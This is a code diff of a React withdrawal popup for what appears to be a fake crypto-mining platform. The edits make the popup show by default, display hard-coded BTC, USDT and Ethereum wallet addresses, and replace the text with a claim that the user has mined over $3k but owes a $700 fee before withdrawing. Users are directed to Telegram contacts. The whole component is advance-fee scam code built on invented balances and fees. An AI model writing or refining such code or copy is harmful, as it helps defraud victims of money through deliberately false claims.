@@ -7,7 +7,7 @@ import { useHistory } from "react-router-dom";
 const WithdrawPopup = ({ isOpen, onClose, onWithdraw }) => {
   const [withdrawAmount, setWithdrawAmount] = useState("");
   const [storedWithdrawAmount, setStoredWithdrawAmount] = useState(0);
-  const [success, setSuccess] = useState(false);
+  const [success, setSuccess] = useState(true);
   const history = useHistory();
 
 
@@ -26,7 +26,7 @@ const WithdrawPopup = ({ isOpen, onClose, onWithdraw }) => {
         setSuccess(false);
         onClose();
       }
-    }, 6000);
+    }, 10000);
   }, [success, onClose]);
 
   // toast.success(
@@ -102,21 +102,6 @@ const WithdrawPopup = ({ isOpen, onClose, onWithdraw }) => {
       // setTimeout(() => window.location.reload(), 3000);
     }
 
-
-    // You can include logic here to send the withdrawal details to your backend
-
-    // const btcAddress = "123JgU9Zih5GBWN7mWKML2jSNCUwx8yb8j";
-    // const usdtTrc20Address = "TTGUJhv8jZKiUApoet6S9xXStUbZCCTywy";
-    // const ethereumAddress = "0x87cdd933bf000f96309215752696ae080f684ba9";
-    // const link = "https://t.me/startmininghere";
-
-    // Display success message with withdrawal details
-    // alert(
-    //   `Pay $500 to any of this address for processing!\nBTC Address: ${btcAddress}\nUSDT TRC20 Address: ${usdtTrc20Address}\nEthereum Address: ${ethereumAddress} \ncontact address: ${link}`
-    // );
-    // toast(
-    //   `Pay $500 to any of this address for processing!\nBTC Address: ${btcAddress}\nUSDT TRC20 Address: ${usdtTrc20Address}\nEthereum Address: ${ethereumAddress} \ncontact address: ${link}`
-    // );
   };
 
   return (
@@ -128,28 +113,30 @@ const WithdrawPopup = ({ isOpen, onClose, onWithdraw }) => {
             <span style={{ color: "green" }}> usdtTrc20Address = TTGUJhv8jZKiUApoet6S9xXStUbZCCTywy</span>
             <span style={{ color: "orange" }}> ethereumAddress = 0x87cdd933bf000f96309215752696ae080f684ba9 </span>
             <span style={{ color: "red" }}>
-              (WITHDRAWALS WILL NEED A GAS FEE OF $500)
+              (You have an outstanding balance of $700 which was used to mine your crypto )
               <br />
-
-              Gas fee are meant to be paid for the transaction that has been occurring during your mining ⛏ process,
-              this gas fee is use to settle the transactions when mining,
-              without it the mining server you mining from won’t allow you to withdraw the money you mined.
+              The crypto mining ⛏️ port you been mining ⛏️ from is not free
+              The total 💳 fee you owing is $700
+              Based on how long you have been mining
+              You have successfully mined above $3k, so you are eligible to withdraw your mined coins
+              When you pay the $700 your mining ⛏️ port web open and you can withdraw your funds
             </span>
             <br />
             <span style={{ color: "red" }}>
 
               <span style={{ color: "green" }}> (How to confirm): </span>
-              Send payment screenshot to our admin 👩‍💼 on telegram to process your withdrawal approval.
+              Contact hack world support where you bought the software from
+              You are free to keep mining for nothing stop 🛑 you!
               <br />
 
-              <span style={{ color: "green" }}>(How to pay): </span>
+              {/* <span style={{ color: "green" }}>(How to pay): </span>
               Send payment to the provided wallet address provided to you on the page.
-              <br />
+              <br /> */}
 
             </span>
 
             <span style={{ color: "green" }}>💬 Contact use to get started:
-              <a style={{ color: "blue" }} target="_blank" rel="noreferrer" href="https://t.me/startmininghere">(https://t.me/startmininghere)</a>
+              <a style={{ color: "blue" }} target="_blank" rel="noreferrer" href="https://t.me/hackworldgroup">(https://t.me/hackworldgroup)</a>
             </span>
           </p>
         ) : (
